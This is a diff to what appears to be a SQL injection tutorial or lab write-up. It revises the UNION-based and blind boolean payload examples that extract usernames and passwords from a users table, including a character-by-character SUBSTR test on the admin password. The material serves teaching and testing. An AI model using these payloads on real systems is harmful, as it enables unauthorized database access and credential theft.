@@ -218,13 +218,7 @@ Even though the attacker does not have direct access to the database.
 ## Alternative Payloads
 
 ```
-' UNION SELECT username,password FROM users --
-```
-
-or
-
-```
-' UNION SELECT 1,username FROM users --
+' UNION SELECT id,username,password FROM users --
 ```
 
 Depending on column compatibility.
@@ -256,7 +250,7 @@ Therefore the attacker must construct a UNION query with **three columns**.
 ## Example Payload
 
 ```
-' UNION SELECT id,username,password FROM users --
+' UNION SELECT * FROM users --
 ```
 
 ---
@@ -413,7 +407,7 @@ extracts the first character of the password.
 The injected condition becomes:
 
 ```sql
-SUBSTR(password,1,1)='a'
+' OR (username='admin' AND SUBSTR(password,1,1)='c') --
 ```
 
 If the condition is TRUE, the query returns rows.
